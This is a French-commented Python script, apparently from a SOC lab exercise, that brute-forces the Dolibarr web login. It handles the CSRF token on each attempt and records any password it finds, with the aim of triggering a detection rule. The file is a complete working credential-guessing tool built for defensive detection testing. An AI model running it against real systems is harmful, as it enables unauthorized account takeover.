#!/usr/bin/env python3
"""
web_bruteforce.py — Scénario S4 : Brute-force Dolibarr (NyxSOC)

Lance une attaque par force brute contre l'interface web de Dolibarr
via une boucle Python qui gère le token CSRF dynamique.

Chaîne d'attaque :
  1. GET /index.php → extraire le token CSRF (anti-csrf-newtoken / input hidden)
  2. POST avec username=admin, password, token, actionlogin=login
  3. Suivre les redirects → si le formulaire login est encore présent → échec
     si on arrive sur le dashboard (plus de formulaire) → succès

Règle attendue : WEB_BRUTEFORCE_001 (Type 1, seuil 20 × 401/403 en 120s).
Apache journalise les 401/403 → Docker syslog → rsyslog → SOC → localhost.log.

Usage :
    python3 web_bruteforce.py [--target http://10.0.1.20] [--username admin]
                              [--wordlist wordlist_s4.txt]

Exemple :
    python3 web_bruteforce.py --wordlist wordlist_s4.txt
"""

import argparse
import json
import logging
import re
import sys
import time
import urllib.parse
from datetime import datetime, timezone

import requests

logging.basicConfig(level=logging.INFO, format="%(message)s")
log = logging.getLogger("s4")

# Token CSRF
_RE_TOKEN_META = re.compile(
    r'<meta\s+name="anti-csrf-newtoken"\s+content="([^"]+)"'
)
_RE_TOKEN_INPUT = re.compile(
    r'<input\s+type="hidden"\s+name="token"\s+value="([^"]+)"'
)

# Détection page de login (présence du formulaire)
_RE_LOGIN_FORM = re.compile(r'<form\s+id="login"\s+name="login"')

# Messages d'échec possibles dans la page
_ERROR_STRINGS = [
    "login or password failed",
    "Login or password failed",
    "login failed",
    "Identifiants incorrects",
    "Wrong login",
]


def extract_token(html: str) -> str | None:
    m = _RE_TOKEN_META.search(html)
    if m:
        return m.group(1)
    m = _RE_TOKEN_INPUT.search(html)
    if m:
        return m.group(1)
    return None


def fmt_ts(dt: datetime) -> str:
    ms = dt.microsecond // 1000
    return dt.strftime(f"%Y-%m-%dT%H:%M:%S.{ms:03d}Z")


def attempt_login(
    session: requests.Session,
    target: str,
    login_url: str,
    username: str,
    password: str,
    token: str,
    debug_first: bool = False,
) -> bool:
    """Tente une connexion. Retourne True si succès, False si échec.

    Principe : on suit les redirects et on vérifie si le formulaire
    de login est encore présent dans la page finale. Si oui → échec.
    Si non (dashboard) → succès.
    """
    data = {
        "username": username,
        "password": password,
        "token": token,
        "actionlogin": "login",
        "loginfunction": "loginfunction",
    }
    full_url = urllib.parse.urljoin(target, login_url)
    try:
        resp = session.post(full_url, data=data, allow_redirects=True, timeout=10)
    except requests.RequestException as e:
        log.debug(f"  [!] Erreur requête : {e}")
        return False

    if debug_first:
        log.debug(f"  [DEBUG] Status final: {resp.status_code}")
        log.debug(f"  [DEBUG] URL finale: {resp.url}")
        log.debug(f"  [DEBUG] Taille réponse: {len(resp.text)}")
        log.debug(f"  [DEBUG] Cookies: {dict(session.cookies)}")

    # Si on est encore sur la page de login (formulaire présent) → échec
    if _RE_LOGIN_FORM.search(resp.text):
        if debug_first:
            log.debug("  [DEBUG] Formulaire login détecté → échec")
        return False

    # Si le formulaire n'est plus là, on a probablement réussi
    # Vérifier quand même les messages d'erreur au cas où
    for err in _ERROR_STRINGS:
        if err in resp.text:
            if debug_first:
                log.debug(f"  [DEBUG] Message d'erreur trouvé: '{err}' → échec")
            return False

    if debug_first:
        log.debug(f"  [DEBUG] Plus de formulaire login, pas d'erreur → succès")
    return True


def main():
    parser = argparse.ArgumentParser(description="S4 — Brute-force Dolibarr (NyxSOC)")
    parser.add_argument("--target", default="http://10.0.1.20", help="URL cible")
    parser.add_argument("--login-url", default="/index.php?mainmenu=home", help="Chemin de la page de login")
    parser.add_argument("--username", default="admin", help="Compte Dolibarr ciblé")
    parser.add_argument("--wordlist", default="wordlist_s4.txt", help="Fichier de mots de passe")
    parser.add_argument("--delay", type=float, default=0.5, help="Délai entre tentatives (secondes)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout HTTP")
    parser.add_argument("--verbose", "-v", action="store_true", help="Log chaque tentative")
    args = parser.parse_args()

    if args.verbose:
        log.setLevel(logging.DEBUG)

    try:
        with open(args.wordlist) as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        log.error(f"[!] Wordlist introuvable : {args.wordlist}")
        log.error("    Génère-la d'abord avec gen_wordlist.py")
        sys.exit(1)

    logdir = "./logs"
    import os
    os.makedirs(logdir, exist_ok=True)

    ts_start = datetime.now(timezone.utc)
    run_id = f"s4_{ts_start.strftime('%Y%m%d_%H%M%S')}"
    logfile = f"{logdir}/{run_id}.log"
    metafile = f"{logdir}/{run_id}.meta.json"

    log.info("==================================================")
    log.info(" NyxSOC — Scénario S4 : Brute-force Dolibarr")
    log.info("==================================================")
    log.info(f" Cible       : {args.target}")
    log.info(f" Login URL   : {args.login_url}")
    log.info(f" Utilisateur : {args.username}")
    log.info(f" Wordlist    : {args.wordlist} ({len(passwords)} entrées)")
    log.info(f" Délai       : {args.delay}s")
    log.info(f" Run ID      : {run_id}")
    log.info(f" Début (UTC) : {fmt_ts(ts_start)}")
    log.info("==================================================")

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) NyxSOC-S4/1.0",
    })

    found = False
    result_password = ""
    attempts = 0
    failures = 0
    log_entries = []

    for idx, pwd in enumerate(passwords, start=1):
        attempts += 1
        ts_try = datetime.now(timezone.utc)

        # 1. GET login page → extraire token
        login_full = urllib.parse.urljoin(args.target, args.login_url)
        try:
            resp_get = session.get(login_full, timeout=args.timeout)
        except requests.RequestException as e:
            log.debug(f"  [{idx}/{len(passwords)}] GET failed: {e}")
            continue

        token = extract_token(resp_get.text)
        if not token:
            log.warning(f"  [{idx}/{len(passwords)}] Token CSRF introuvable")
            log.debug(f"  [DEBUG] Extrait HTML (200 premiers chars): {resp_get.text[:200]}")
            continue

        # 2. POST login (première tentative avec debug)
        success = attempt_login(
            session, args.target, args.login_url,
            args.username, pwd, token,
            debug_first=(idx == 1 and args.verbose),
        )

        log_msg = f"  [{idx}/{len(passwords)}] {args.username}:{pwd} -> {'OK' if success else 'FAIL'}"
        log_entries.append({
            "attempt": idx,
            "password": pwd,
            "success": success,
            "ts_utc": fmt_ts(ts_try),
        })

        if args.verbose or success:
            log.info(log_msg)
        else:
            log.debug(log_msg)

        if success:
            found = True
            result_password = pwd
            log.info(f"[+] Mot de passe trouvé : {args.username}:{pwd}")
            break
        else:
            failures += 1

        time.sleep(args.delay)

    # Si aucune tentative n'a pu aboutir (token jamais trouvé)
    if attempts == 0:
        log.error("[!] Aucune tentative effectuée — vérifier la connectivité et le formulaire.")
        return 1

    ts_end = datetime.now(timezone.utc)
    duration = (ts_end - ts_start).total_seconds()

    with open(logfile, "w") as f:
        for entry in log_entries:
            status = "SUCCESS" if entry["success"] else "FAIL"
            f.write(f"[{entry['attempt']}] {args.username}:{entry['password']} -> {status} @ {entry['ts_utc']}\n")

    meta = {
        "scenario": "S4_WEB_BRUTEFORCE",
        "run_id": run_id,
        "target": args.target,
        "login_url": args.login_url,
        "actor_ip": "10.0.1.50",
        "username": args.username,
        "wordlist_size": len(passwords),
        "attempts": attempts,
        "failures": failures,
        "found": found,
        "result_password": result_password if found else None,
        "ts_start_utc": fmt_ts(ts_start),
        "ts_end_utc": fmt_ts(ts_end),
        "duration_seconds": round(duration, 3),
        "expected_rule": "WEB_BRUTEFORCE_001",
        "mitre": "T1110.001",
    }

    with open(metafile, "w") as f:
        json.dump(meta, f, indent=2)

    log.info("==================================================")
    log.info(f" Fin (UTC)     : {fmt_ts(ts_end)}")
    log.info(f" Durée         : {duration:.3f}s")
    log.info(f" Tentatives    : {attempts} ({failures} échecs)")
    if found:
        log.info(f" Résultat      : {args.username}:{result_password}")
    else:
        log.info(f" Résultat      : aucun mot de passe trouvé")
    log.info(f" Log complet   : {logfile}")
    log.info(f" Métadonnées   : {metafile}")
    log.info("==================================================")
    log.info("[+] Terminé. Vérifie les logs Apache sur le serveur et le SOC.")
    log.info("    Sur le SOC : tail -f /var/log/remote/localhost.log | grep dolibarr")

    return 0 if found else 1


if __name__ == "__main__":
    sys.exit(main())
